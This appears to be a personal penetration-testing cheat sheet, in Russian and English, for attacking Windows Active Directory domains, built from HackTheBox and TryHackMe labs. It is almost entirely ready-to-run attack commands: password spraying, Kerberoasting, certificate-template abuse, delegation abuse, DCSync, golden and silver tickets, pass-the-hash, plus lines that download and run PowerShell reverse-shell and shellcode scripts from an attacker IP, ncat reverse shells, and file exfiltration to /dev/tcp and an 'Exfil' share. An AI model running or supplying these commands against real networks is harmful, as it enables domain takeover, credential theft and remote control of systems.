# DOMAIN


# Check list domain

* clock sync

		sudo timedatectl set-ntp off
		sudo timedatectl set-ntp false 
		sudo timedatectl set-time '20:20:10'
		sudo date --set="2022-01-01 12:00:00"
  		sudo net time set -S 10.10.11.181
  		sudo ntpdate
* Shares Enum

  		crackmapexec smb 192.168.2.123 -p '' -u ''
  		crackmapexec smb 192.168.2.123 -p 'jksdfhgv' -u '' -M spider_plus
		cat 192.168.134.10.json | jq '. | map_values(keys)'
  		crackmapexec smb hosts_r.txt -u '' -p '' --get-file \\kanban\pkb.zip pkb.zip
		
  		Snaffler.exe -s -o snaffler_output.log -d test.local -c 10.10.10.1

* Расшифровка пароля из XML для груповой политики для старых Windows

  		gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
  
* user found
	- with Kerbrute

		https://github.com/insidetrust/statistically-likely-usernames (списки юзеров)
		sudo git clone https://github.com/ropnop/kerbrute.git (репозиторий кербрут)
		kerbrute userenum --dc 172.16.5.5 -d INLANEFREIGHT.LOCAL /opt/jsmith.txt (пример комманды)

 	- with crackmapexec
  
		crackmapexec smb 10.10.10.10 -p "anonymous" -p '' --rid-brute
		
	- with RPCCLIENT

		rpcclient -U '' -N  10.10.10.169
    
* MultiCast enum

		sudo responder -I ens224
  		(ответ собирается в /usr/share/responder/logs)

* kerbrute
    		
		~/kerbrute_linux_amd64 userenum users.txt --dc 192.168.50.110 -d vd.local
* not_preauth

  		impacket-GetNPUsers -dc-ip 192.168.50.110 vd.local/ -usersfile users.txt | grep '$krb'

  		-----Kerberoasting without credentials

  		python3 -m venv impacket-fork
		source ./impacket-fork/bin/activate
		git clone https://github.com/ThePorgs/impacket.git
		cd impacket
		python3 setup.py install

		GetUserSPNs.py -no-preauth jjones (not preauth user) -request -usersfile ../usernames.txt rebound.htb/ -dc-ip 10.10.11.231

* validate creds

		rdp, winrm, smb
   		crackmapexec rdp 192.168.50.110 -u 'nancy.carline' -p 'cowboys'

* local admin
  
		crackmapexec smb 192.168.50.110 -u 'Administrator' -p 'Password321' --local-auth 

* Users auth on host

  		sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
  
* Password policies
   
		crackmapexec smb 192.168.50.110 -u 'albertina.albertina' -p animal --pass-pol 
* Password Spray

  		crackmapexec smb 192.168.50.110 -u users.txt -p passwords.txt --continue-on-success

  		(in windows)
  		https://github.com/dafthack/DomainPasswordSpray

  		Import-Module .\DomainPasswordSpray.ps1
		Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
  
* Ldapdomaindump (1 05)

		ldapdomaindump -u 'vd.local\albertina.albertina' -p animal 192.168.50.110 
		from users.json bloodhount 
		cat 20240201210210_users.json|jq '.data[].Properties | .samaccountname + ":" + .description' -r

* Description whitch RPCCLIENT

  		rpcclient -U '' -N  10.10.10.169                                                 
		rpcclient $> querydispinfo
  
* Change Password

 	   	impacket-changepasswd 'vd.local/lamont.sibeal:passwd'@192.168.50.110 -newpass 'Password123'

* Bloodhoundlist 

		bloodhound-python -d vd.local -u lamont.sibeal -p Password123 -c all --dns-tcp -ns 192.168.50.110
		bloodhound-python -d htb.local -ns 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' -c all
		bloodhound-python -u ldap_monitor -p '1GR8t@$$4u' -d rebound.htb -dc dc01.rebound.htb --zip -c Group,LocalAdmin,RDP,DCOM,Container,PSRemote,Session,Acl,Trusts,LoggedOn -ns 10.10.11.231
		
		Запуск

		cd /usr/bin && sudo ./neo4j console

		cd /home/max/BloodHound-linux-x64_new && ./BloodHound --no-sandbox
  
  		cat 20240201210210_users.json|jq '.data[].Properties | .samaccountname + ":" + .description' -r
* spn

		impacket-GetUserSPNs -dc-ip 192.168.50.110 vd.local/arly.ayn:Password123 -request

  		 .\Rubeus.exe kerberoast /stats

* DCOM Abusing

  		impacket-dcomexec -object MMC20 -silentcommand -debug jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4 'powershell.exe Invoke-WebRequest -Uri http://10.10.14.94:80/Invoke-PowerShellTcp.ps1 -OutFile C:\Windows\TEMP\shell.ps1'   (выполнение комманд - загрузка скрипта)

  		impacket-dcomexec -object MMC20 -silentcommand -debug jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.10.11.4 'powershell.exe C:\Windows\TEMP\shell.ps1'


  		

# DNS
ipconfig /flushdns  (очистить кеш днс)

	 nslookup
	> server 10.10.10.248
	Default server: 10.10.10.248
	Address: 10.10.10.248#53
	> svc_int.intelligence.htb
	Server:         10.10.10.248
	Address:        10.10.10.248#53

dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.10.10.248 -a add -r web1 -d 10.10.14.58 -t A   (создание ДНС записи в домене)

dig axfr students.local @192.168.50.12 (трансфер зоны DNS)

gobuster dns -d 'snoopy.htb' -w /etc/theHarvester/wordlists/dns-names.txt -t 100 (нужно скачать словарик днс - секлист дисковери днс субдомаин топ 1 милион)
https://github.com/mxdelta/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt



# Проверка сертификатов

	certipy-ad find -u svc_ldap@authority.htb -p lDaP_1n_th3_cle4r! -dc-ip 10.10.11.222

* Sertifycate
		pip3 install -U certipy-ad
		
  		Поиск центра сертификации

		crackmapexec ldap 'dc.sequel.htb' -d 'sequel.htb' -u 'Ryan.Cooper' -p 'NuclearMosquito3' -M adcs

		certipy-ad find -u 'n.popov' -p 'Sagatuarus2' -dc-ip '192.168.134.10' -stdout

		1. Поиск уязвимых шаблонов
	
		.\Certify.exe find /vulnerable

		certipy-ad find -u 'ryan.cooper@sequel.htb' -p 'NuclearMosquito3' -dc-ip '10.10.11.202' -vulnerable -stdout -debug
		
		ESC1 - 1. Запрс сертификата для administrator

		.\certify request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
		& "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx


  		certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication -debug

		ESC1 - 2. Получаем TGT и хеш администратора на основе сертификата

		.\rubeus asktgt /user:administrator /certificate:administrator.pfx /getcredentials /nowrap

				Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
				cd .\Invoke-TheHash\;Import-Module .\Invoke-TheHash.psm1
				PS C:\Tools> Invoke-TheHash -Type SMBExec -Target localhost -Username Administrator -Hash 2b576acbe6bcfda7294d6bd18041b8fe -Command "net localgroup Administrators grace /add"
				
		certipy-ad auth -pfx administrator.pfx
  		
		certipy auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip 10.129.205.199

	ESC3 - запрос сертификата на основании другого сертификата

		certipy-ad req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template ESC3 -dc-ip 10.129.56.123
  		
		certipy-ad req -u 'blwasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -template 'User' -on-behalf-of 'lab\haris' -pfx blwasp.pfx -dc-ip 10.129.56.123

  		certipy-ad auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip 10.129.56.123

		export KRB5CCNAME=administrator.ccache
		
		impacket-smbexec -k -no-pass LAB-DC.LAB.LOCAL

		certipy-ad auth -pfx sql.pfx

	ESC8 - Сертификат рилей

		sudo certipy-ad relay -target dc.domain.local -ca domain-DC-CA-1  -template Machine  (DomainController - если атака на dc b jy hfpytcty c ADCS)
		coercer coerce -l 192.168.134.24(listener_host) -t 192.168.134.12 (target) -u s.ivanov -p Venturers2004 -d domain.local -v
  		python3 PetitPotam -u BlWasp -p 'Password123!' -d 'lab.local' 172.16.19.19(наш) 172.16.19.3(атакуемый)
  
  	Certifried (CVE-2022-26923) до мая 2022 года
  
			смотрим [*] Certificate has no object SID???
  
  		certipy req -u 'BlWasp@lab.local' -p 'Password123!' -ca lab-LAB-DC-CA -dc-ip 10.129.228.237 -template User

			узнаем контроллер домена и центр сертификации
  
		certipy find -u 'BlWasp@lab.local' -p 'Password123!' -stdout -vulnerable

			Вводим в домен новую машинну с днс контроллера домена
  
		certipy account create -u 'blwasp@lab.local' -p 'Password123!' -dc-ip 10.129.228.134 -user NEWMACHINE -dns DC02.LAB.LOCAL

			запрашиваем для нее сертиикат
		pcertipy-ad req -u 'NEWMACHINE$' -p 'TwiLzWLT56X0Pd73' -ca domain-DC-CA-1 -template 'Machine' -dc-ip 192.168.134.10 -dns dc.domain.local

			авторизуемся с сертификатом и получаем креды

		certipy auth -pfx dc02.pfx

			делаем DCSYNC
		impacket-secretsdump 'LAB.LOCAL/dc02$@DC02.LAB.LOCAL' -hashes :6a5bfcba90a4ed0a8dc96448b7646c3e
			а потом  подключаемся
  		psexec.py lab.local/Administrator@172.16.19.5 -hashes aad3b435b51404eeaad3b435b51404ee:6e599ada28db049c044cc0bb4afeb73d


# DELEGATION

* Find accaunt with delegation
  
  		findDelegation.py INLANEFREIGHT.LOCAL/carole.rose:jasmine
* RBCD
		(ИЗ ВИНДВС)

		C:\Tools\mimikatz_trunk\x64\mimikatz.exe


		mimikatz # token::elevate

		mimikatz # lsadump::secrets   			----- Запросим пароль учетки имеюзей право делегироватся

		Затем просим TGT

  		kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:redacted

		Затем просим TGS

		kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones(админ на нужной такчуке) /service:http/THMSERVER1.za.tryhackme.loc
		tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:wsman/THMSERVER1.za.tryhackme.loc

		Затем импортируем TGS через mimikatz

		mimikatz # privilege::debug
		Privilege '20' OK

		mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

		mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

		и входим

		И заходим через wsman


		New-PSSession -ComputerName thmserver1.za.tryhackme.loc

		Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc

		ИЛИ-------------

  		Нуежен тот кто влияет на конечный хост (DC, SQL, HTTP) потому что нужно добавить делегата в ACL хоста

  		python3 rbcd.py -dc-ip 10.129.205.35 -t DC01 -f HACKTHEBOX inlanefreight\\carole.holmes:Y3t4n0th3rP4ssw0rd
		Sudo certipy-ad auth -pfx sql.pfx -domain domain.local -dc-ip 192.168.134.10 (DC) -ldap-shell
  				set_rbcd SQL$ HACK$
				перед этим создаем фейковый хост
  				addcomputer.py -computer-name 'HACKTHEBOX$' -computer-pass Hackthebox123+\! -dc-ip 10.129.205.35 inlanefreight.local/carole.holmes  		

		или
		
		addcomputer.py -computer-name 'HACKTHEBOX$' -computer-pass Hackthebox123+\! -dc-ip 10.129.205.35 inlanefreight.local/carole.holmes:Y3t4n0th3rP4ssw0rd

  		прописываем ACL на конечном хосте DC01

  		python3 rbcd.py -dc-ip 10.129.205.35 -t DC01 -f HACKTHEBOX inlanefreight\\carole.holmes:Y3t4n0th3rP4ssw0rd

  		Получаем TGT TGS self and Proxy

  		getST.py -spn cifs/DC01.inlanefreight.local -impersonate Administrator -dc-ip 10.129.205.35 inlanefreight.local/HACKTHEBOX:Hackthebox123+\!
			
  		Запрашивает тикет от имени фейкового хоста с ипмперсонификацией
		getST.py -spn cifs(ldap)/sql.domain.local -impersonate Administrator -dc-ip 192.168.134.10 domain.local/HACK:Password123

  		и логинимся с тикетом
		export KRB5CCNAME=administrator.ccache
  		Psexec.py -k -no-pass sql.domain.local -dc-ip 192.168.134.11

  		или dcsync
* DCSYNC

		Rubeus triage
  		Rubeus dump
		билет в файл и убираем пробелы
затем

  		[IO.File]::WriteAllBytes("C:\Users\spirit\Desktop\DC.kirbi", [Convert]::FromBase64String("Base64"))  (путь только полный!!!! а  base 64 вставляем билет без пробелов)

      		kerberos::ptt DC.kirbi
		lsadump::dcsync /domain:domain.local /user:Administrator
или
  		
		nano ticket.kirbi_b64       
  		base64 -d ticket.kirbi_b64 > ticket_real.kirbi
   		ticketConverter.py ticket_real.kirbi ticket.ccache
		export KRB5CCNAME=ticket.ccache 
        	crackmapexec smb dc.domain.local -k --use-kcache --ntds

или
  		KRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'
		secretsdump.py -k -no-pass -dc-ip '10.129.205.35' @'dc01.inlanefreight.local'
    		
# NTLMRELAY когда у одного компа есть админские права для другого

		у 14 есть разрешение на админство от 12
  		
		sudo impacket-ntlmrelayx -t smb://192.168.134.14 --delegate -smb2support

  		на своем хосте

    		proxychains  coercer coerce -l 192.168.134.24 -t 192.168.134.12 -u s.ivanov -p DgdCQTghHGA2ad -d domain.local


на своем хосте запускаем ntlmrelay  м слушаем серевер 1 -----   сервер 2   админ для сервер 1 

	python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"THMSERVER1 (IP)" -debug

на компроментате запускаем

	C:\Tools\>SpoolSample.exe THMSERVER2.za.tryhackme.loc (IP) "Attacker IP (мой 3 IP)"



# Unconstrained delegation (linux)

		.\Rubeus.exe tgtdeleg /nowrap
	$  base64 ticket.kirbi.b64 -d > ticket.kirbi
	$ impacket-ticketConverter ticket.kirbi ticket.ccache
	$ export KRB5CCNAME=ticket.ccache
	$ impacket-secretsdump licordebellota.htb/pivotapi\$@pivotapi.licordebellota.htb -dc-ip 10.10.10.240 -no-pass -k

	# TGT Unconstrained delegation
	(Нужен rubeus и mimikatz и printspooler)
	------Нужен скомпроментированный сервер службы sql или еще чего и админ права на нем------

	1. Получить TGT привелигированного юзера или компутера

	.\Rubeus.exe monitor /interval:5 /nowrap

	.\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local

  	2. Обновляем его в память
   
	.\rubeus.exe renew /ticket:<............> /ptt
 	
	3. Мимикатзом делаем DCSYNC

  	lsadump::dcsync /user:Administrator

	4. Крафтим TGT

   	.\Rubeus asktgt /rc4:hashhhh /user:Administrator /ptt

	5. Юзаем
    	 dir \\dc01.domen.local\c$\flag.txt
    
	6. Если уже сть билеты в памяти то можно просто

  	./rubeus.exe dump /nowrap
		И ЗАТЕМ
	.\rubeus.exe renew /ticket:<............> /ptt

	
# golden ticket

	kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /krbtgt:<NTLM hash of KRBTGT account> /endin:600 /renewmax:10080 /ptt
	
 	kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt
		
	/admin — имя пользователя, которое мы хотим выдать за себя. Это не обязательно должен быть действительный пользователь.
	/domain — полное доменное имя домена, для которого мы хотим создать билет.
	/id — RID пользователя. По умолчанию Mimikatz использует RID 500, который является RID учетной записи администратора по умолчанию.
	/sid — SID домена, для которого мы хотим сгенерировать билет.
	/krbtgt — NTLM- хеш учетной записи KRBTGT.
	/endin — срок действия билета. По умолчанию Mimikatz генерирует билет, действительный в течение 10 лет. по умолчанию Политика Kerberos для AD составляет 10 часов (600 минут).
	/renewmax — максимальный срок действия билета с продлением. По умолчанию Mimikatz генерирует билет, действительный в течение 10 лет. по умолчанию Политика Kerberos для AD составляет 7 дней (10080 минут).
	/ptt — этот флаг сообщает Mimikatz о необходимости внедрения билета непосредственно в сеанс, что означает, что он готов к использованию. 


Проверка
	PS C:\Tools\mimikatz_trunk\x64> dir \\thmdc.za.tryhackme.loc\c$\


# silver ticket

  	kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:<Domain SID> /target:<Hostname of server being targeted> /rc4:<NTLM Hash of machine account of target> /service:cifs /ptt

   	 kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:THMSERVER1 /rc4:4c02d970f7b3da7f8ab6fa4dc77438f4 /service:cifs /ptt

      	 /admin — имя пользователя, которое мы хотим выдать за себя. Это не обязательно должен быть действительный пользователь.
   	 /domain — полное доменное имя домена, для которого мы хотим создать билет.
   	 /id — RID пользователя. По умолчанию Mimikatz использует RID 500, который является RID учетной записи администратора по умолчанию.
   	 /sid — SID домена, для которого мы хотим сгенерировать билет.
   	 /target — имя хоста нашего целевого сервера. Давайте сделаем THMSERVER1.za.tryhackme.loc, но это может быть любой хост, присоединенный к домену.
   	 /rc4 - NTLM -хеш учетной записи машины нашей цели. Просмотрите результаты синхронизации постоянного тока и найдите NTLM- хеш THMSERVER1$. Знак $ указывает, что это учетная запись компьютера.
  	  /service — услуга, которую мы запрашиваем в нашем TGS. CIFS — беспроигрышный вариант, поскольку он обеспечивает доступ к файлам.
  	  /ptt — этот флаг сообщает Mimikatz о необходимости внедрения билета непосредственно в сеанс, что означает, что он готов к использованию. 

проверка

	dir \\thmserver1.za.tryhackme.loc\c$\
      
    
      В ЛИНУКС
      		SID domain -->	(whoami /all)

  		крафтим silver тикет from administrator--->
  
		impacket-ticketer -nthash 1443EC19DA4DAC4FFC953BCA1B57B4CF -domain-sid S-1-5-21-4078382237-1492182817-2568127209 -domain sequel.htb -dc-ip dc.sequel.htb -spn nonexistent/DC.SEQUEL.HTB Administrator

  		идем к службе ---->
    
		export KRB5CCNAME=Administrator.ccache;impacket-mssqlclient -k dc.sequel.htb
 

# Добавление компутера в домен

		impacket-addcomputer authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -method LDAPS -computer-name 'Evil-PC' -computer-pass 'Password123'

		sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'plaintext$'  (через ntlmrelay) + нужна провокация на идентификацию respnder or coerser)
  		
 * PSEXEC ПО БЕЛЕТУ PSExec.exe -accepteula \\sql01.inlanefreight.local cmd
* smbexec xthtp ntlmrelay  proxychains4 -q smbexec.py INLANEFREIGHT/PETER@172.16.117.50 -no-pass

# RunAsCS

.\RunasCs backup IZtLVsqMDMENsTTekNwKwHGrFpmANUFgxOwvHREm --bypass-uac --logon-type 8 cmd.exe -r 10.10.14.49:445

#ACL ( Net rpc and bloodyad and certypy

net rpc group addmem "SERVICEMGMT" "OOREND" -U "REBOUND.HTB/OOREND" -S "REBOUND.HTB" 		(Добавить пользователя в группу)

или 

https://github.com/CravateRouge/bloodyAD?tab=readme-ov-file

python3 -m venv venv

source venv/bin/activate

pip3 install -r requirements.txt  


./bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb  add groupMember ServiceMgmt oorend		((Добавить пользователя в группу))

net rpc group members "ServiceMGMT"  -U "rebound.htb"/"oorend"%'1GR8t@$$4u' -S "dc01.REBOUND.HTB"		(проверка членов группы)

./bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb  add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB'  oorend		(Generic all - добавить себя в OU )

./bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb  set password winrm_svc 'Password123!' 		(смена пароля при наличии прав)

 certipy shadow auto -username oorend@rebound.htb -password '1GR8t@$$4u' -k -account winrm_svc -target dc01.rebound.htb		(shadow credential)
 
./bloodyAD.py -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb  add shadowCredentials winrm_svc 		(shadow credential)

 python3 PKINITtools/gettgtpkinit.py -cert-pem ipWe9rd5_cert.pem -key-pem ipWe9rd5_priv.pem rebound.htb/winrm_svc ipWe9rd5.ccache 	(получение билета керберос)

 export KRB5CCNAME=ipWe9rd5.ccache

 evil-winrm -i dc01.rebound.htb -r rebound.htb
 
 
 # Получение пароля LAPS Admin

	Юзер состоит в групе LAPS Admin
	
		https://github.com/n00py/LAPSDumper.git
    	
		$ python laps.py -u user -p e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c -d domain.local -l dc01.domain.local

  		В Виндовс Laps

		https://github.com/leoloobeek/LAPSToolkit.git
	
		Find-AdmPwdExtendedRights -Identity * (THMorg)
		runas /netonly /user:bk-admin "cmd.exe"
		Get-AdmPwdPassword -ComputerName Creds-Harvestin

	

# Обнаружение машин в сети

fping -ag 192.168.50.1/24 2>/dev/null 

# передача файлов по сети

https://steflan-security.com/shell-file-transfer-cheat-sheet/

# Подключение по РДП

rdesktop -u Administrator -p Admin123 -d ROOT.DC 192.168.50.200  

для машины в рабочей группе 

xfreerdp /v:[IP] /u:[USERNAME] /p:'[PASSWORD]' /d:[domain] /dynamic-resolution /drive:linux,/tmp

xfreerdp /v:192.168.50.200 /d:root.dc /u:administrator /p:Admin123

xfreerdp /v:192.168.50.200 /d:root.dc /u:Administrator /pth:hash_password (/p:hash??????)

xfreerdp /v:192.168.50.200 /d:root.dc /u:administrator /p:Password123 /sec:rdp  - если TLS не поддерживается

FreeRDP( установка sudo apt install freerdp2-x11), Vinagre (установка sudo apt install vinagre)

РДП из коммандной строки виндовс
mstsc /v:<адрес_компьютера>

# Поднять SMB сервер

sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .

On Windows (update the IP address with your Kali IP):

copy \\10.10.10.10\kali\reverse.exe C:\PrivEsc\reverse.exe

--Доступ к smb директории

New-PSDrive -Name "Exfil" -PSProvider "FileSystem" -Root "\\10.10.14.49\share"

copy * Exfil:\

Get-Content //10.10.14.4/file

net use z: //10.10.10.14/shares

# Поднять HTTP сервер

python3 -m http.server 8080

# Cтянуть c HTTP сервера

curl -o file http://file

wget https://example.com/file.zip - стянуть файйл с сервера. 

для повершелл wget "http://10.18.35.17:8888/Zero.exe" -OutFile z1.exe

IEX(New-Object Net.WebClient).DownloadString ("http://192.168.181.128:8000/CodeExecution/Invoke-Shellcode.ps1 ")

iwr -uri http://192.168.x.xx/adduser.exe -OutFile adduser.exe

certutil.exe -f -split -urlcache http://ip/nc.exe c:\windows\temp\nc.exe


# Поднять NetCAt

На удалённом сервере запускаем Ncat следующим образом:
ncat -l -e "/bin/bash" 43210
nc -l -p <порт команды> -e cmd.exe
И подключаемся с локального компьютера:
ncat 185.26.122.50 43210

Подключение к Ncat если удалённая машина находиться за NAT
На локальном компутере
ncat -l 43210
А на удалённом компьютере мы запускаем программу так:
ncat -e "/bin/bash" ХОСТ 43210

Как передать файлы на удалённый компьютер
С помощью Ncat можно выгрузить файлы на удалённый сервер. К примеру, мне нужно отправить файл some_stuff.txt. Тогда на сервере (куда будет загружен файл), запускаю:
ncat -lvnp 43210 > some_stuff.txt
А на локальном компьютере (с которого будет выгружен файл) запускаю:
ncat 185.26.122.50 43210 < some_stuff.txt

или можно отправить - cat some_stuff.txt > /dev/tcp/10.10.14.7/43210

Когда закончится передача, обе сессии ncat завершаться.

Как загрузить файл с удалённого компьютера
Предположим, мне нужно скачать с удалённого компьютера файл some_stuff.txt. Тогда на сервере я запускаю:
ncat -l 43210 < some_stuff.txt
А на локальном компьютере, куда будет скачен файл, запускаю Ncat следующим образом:
ncat 185.26.122.50 43210 > some_stuff.txt



# Библиотека импакет

git clone https://github.com/SecureAuthCorp/impacket.git

https://habr.com/ru/companies/ruvds/articles/743444/  (Описание импакета)


# выполнение CMD на удаленной машине разными портами

ВиинРМ из виндовс

		winrs.exe -u:Administrator -p:Mypass123 -r:target cmd

# Мы можем добиться того же с помощью Powershell, но для передачи других учетных данных нам нужно будет создать объект PSCredential:

$username = 'Administrator';
$password = 'Mypass123';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;

Получив объект PSCredential, мы можем создать интерактивный сеанс с помощью командлета Enter-PSSession:

Enter-PSSession -Computername TARGET -Credential $credential

Powershell также включает командлет Invoke-Command, который удаленно запускает ScriptBlocks через WinRM. Учетные данные также должны передаваться через объект PSCredential:

Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}




PSEXEC ПО БЕЛЕТУ PSExec.exe -accepteula \\sql01.inlanefreight.local cmd
smbexec через ntlmrelay  proxychains4 -q smbexec.py INLANEFREIGHT/PETER@172.16.117.50 -no-pass

https://www.thehacker.recipes/a-d/movement/ntlm/pth

winexe -U 'admin%password123' //10.10.0.66 cmd.exe

(ПО БЕЛЕТУ)

PSExec.exe -accepteula \\sql01.inlanefreight.local cmd  

PsExec64.exe \\dc01 cmd.exe   (порт 445 smb)

Psexec -i \\192.168.50.200 -u administrator -s cmd.exe Привелигерованный режим... (если уже админ то ситем)

Имперсонификация PsExec64.exe -i -s cmd PsExec64.exe -i -u "nt authority\local service" cmd

impacket-psexec authority.htb/svc_@10.10.11.222 -s cmd (нужен пароль)

impacket-psexec Administrator@192.168.50.200 -hashes aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71

psexec.py egotistical-bank.local/administrator@10.10.10.175 -hashes d9485863c1e9e05851aa40cbb4ab9dff:d9485863c1e9e05851aa40cbb4ab9dff

для psexec reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f


impacket-wmiexec active.htb/Administrator:Ticketmaster1968@10.10.10.100

impacket-wmiexec -hashes :9935hash domain/administratot@192.168.50.123 "ipconfig"   (на 135 порту wmi)

impacket-wmiexec -hashes :a57b67b0bfe5dbd258226194f0caf201 corp/mary@192.168.x.xx

impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71 root.dc/administrator@192.168.50.200  (CMD не надо!!!)


pth-winexe -U ROOT.DC/Administrator%Password123 //192.168.50.200 cmd  (протокол smb порт 445) 

pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71 //192.168.50.200 cmd

evil-winrm -i 192.168.50.200 -u Administrator -H 58a478135a93ac3bf058a5ea0e8fdb71   (протокол winRM порт 5985 или 5986)

evil-winrm -i 10.129.216.184 -u svc_ -p _1n_th3_cle4r!
      - menu (можно обходить повершелл)
      
evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S (для захода по сертификату)

evil-winrm -r SCRM.LOCAL -i dc1.scrm.local (для захода по kerberos)

in /etc/krb5.conf

[libdefaults]
	default_realm = SCRM.LOCAL

[realms]
	SCRM.LOCAL = {
		 kdc = dc1.scrm.local 
   }

[domain_realm]
scrm.local = SCRM.LOCAL
	scrm.local = SCRM.LOCAL


smbexec administrator:pasword123@192.168.50.200

impacket-smbexec active.htb/Administrator:Ticketmaster1968@10.10.10.100

# Сетевые сервисы SSH

--Создание ключей
	ssh-keygen -f theseus
	key.pub - бросаем на сервер и переименовываем в authorized_keys
 	своц ключ помечаем chmod 600
  
(по умолчанию ключ называется id_rsa и id_rsa.pub)

ssh john@10.8.0.14

Передадим файл на удаленную машину по SSH с помощью scp

scp winPEASx64.exe helpdesk@192.168.50.38:C:\\Users\\helpdesk\\

scp pspy64s floris@10.10.10.150:/tmp

(Надо находится снаружи машины, в директории где файл)

и обратно

scp lnorgaard@10.10.11.227:/home/lnorgaard/RT30000.zip RT300010.zip

scp -i ./rsa/2048/4161de56829de2fe64b9055711f531c1-2537 n30@weakness.jth:/home/n30/code .

!!!sftp Administrator@10.10.223.139   (как FTP)

 - Основные пользовательские ключи обычно хранятся в директории `~/.ssh/id_rsa` (домашняя директория пользователя).

~/.ssh/id_rsa
~/.ssh/id_rsa.pub

ssh ключи всегда хранятся в папке пользователя user/.ssh

если у меня есть #id_rsa# а на серваке id-rsa.pub

(ключи всегда должны быть chmod 600)

то можно !!!!! ssh -i id_rsa daniel@10.129.95.192 !!!!!!

для доступа к закрытому ключу может потребоваться кодовая фраза, тогда

ssh2john id_rsa > hash_rsa  
                                                                                                                                               
john hash_rsa --wordlist=/usr/share/wordlists/rockyou.txt


ssh -i 4161de56829de2fe64b9055711f531c1-2537 n30@weakness.jth (ключ приватный)

# FTP

wget -m --no-passive ftp://10.10.10.98


# Включение линукс как прокси сервер
---на linux
echo 1>/proc/sys/net/ipv4/ip_forward
sudo iptables -A FORWARD -i tun0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A FORWARD -i wlan0 -o tun0 -j ACCEPT
sudo iptables -t nat -A POSTROUTING -s 192.168.50.0/24 -o tun0 -j MASQUERADE
---на windows
route add 10.10.10.0/23 mask 255.255.254.0 192.168.50.123 

# ПРОБРОС ПОРТОВ ПО SSH

у меня открывается 4444 на localhost и пробрасывается на 5432 228.195 тачки

ssh -L 4444:localhost:5432 christine@10.129.228.195

psql -U christine -h localhost -p 4444

# ПРОБРОС ПОРТОВ - CHISEL

-- на удаленной машине

 .\chisel.exe client (атакующий) 10.71.101.248:8080 R:socks

- У себя
в файле /etc/proxychains4.conf ----->>>>    socks5  127.0.0.1 1080

./chisel server --socks5 --reverse

proxychains curl ....
-----------------------------------------------------
- На атакуемом хосте:
  
.\chisel.exe client (мой хост)10.71.101.248:9090 R:80:(атакуемый хост)127.0.0.1:80

